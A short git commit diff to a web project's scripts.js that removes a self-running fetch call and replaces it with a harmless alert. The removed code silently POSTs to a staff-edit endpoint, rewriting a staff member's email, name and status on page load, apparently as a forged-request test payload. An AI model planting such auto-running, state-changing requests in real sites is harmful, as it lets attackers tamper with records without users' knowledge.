265d1cc894ac583c80794cec19b94b35401c8458
I Kadek Laga Dwi Pandika <63577972+lagadwi@users.noreply.github.com>
2025-08-13 11:30:01 +0800

    Update scripts.js

--- js/scripts.js
+++ js/scripts.js
@@ -1,3 +1,3 @@
-(function test() {
-    fetch('/Staff/Edit/1337', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'Email=testks11%20mail.com&StaffId=A08&Fullname=hehekekww&DateJoined=05%2F07%2F2025&BaseLocation=2&StaffStatus=1'});
-})();
+alert((function test() {
+    return "Hello from test function!";
+})());
